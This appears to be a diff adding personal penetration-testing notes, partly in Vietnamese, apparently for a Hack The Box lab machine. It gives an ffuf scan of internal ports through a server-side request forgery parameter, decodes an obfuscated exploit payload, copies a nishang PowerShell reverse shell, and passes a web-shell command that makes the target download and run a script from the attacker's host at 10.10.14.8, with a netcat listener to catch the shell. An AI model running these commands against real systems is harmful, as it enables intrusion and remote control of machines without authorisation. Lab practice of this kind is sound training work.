@@ -1,0 +1,32 @@
+ffuf -u http://staging.love.htb/beta.php -timeout 1 -d 'file=http://127.0.0.1:FUZZ&read=Scan+File' -w ports -H 'Content-Type: application/x-www-form-urlencoded'
+
+Chuyển python2 sang python3 bằng lệnh
+2to3-2.7 43967.py
+
+Copy file trên searchploit
+searchploit -m 
+Đọc file trên searchploit
+searchploit -x
+grep payload 49445.py|head -2|tail -1 > test.php
+<?php
+$evalCode = gzinflate(base64_decode($payload));$
+echo($evalCode);$
+?>
+
+php test.php > out
+convert base64 string với câu lệnh sau:
+echo -n "ENCODE64" | base64 -d > t
+
+Dán đoạn copy thứ 2 trong Vi:
+Ctrl + shift + insert
+
+Sử dụng Shell Powsershell ở đường dẫn sau
+cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
+
+Trên shell.php?cmd= dùng lệnh sau để file transfer:
+
+cmd=powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/shell.ps1')"
+
+# script shell.log
+# rlwrap nc -lvnp 9001
+rlwrap just gives me the up and down arrow
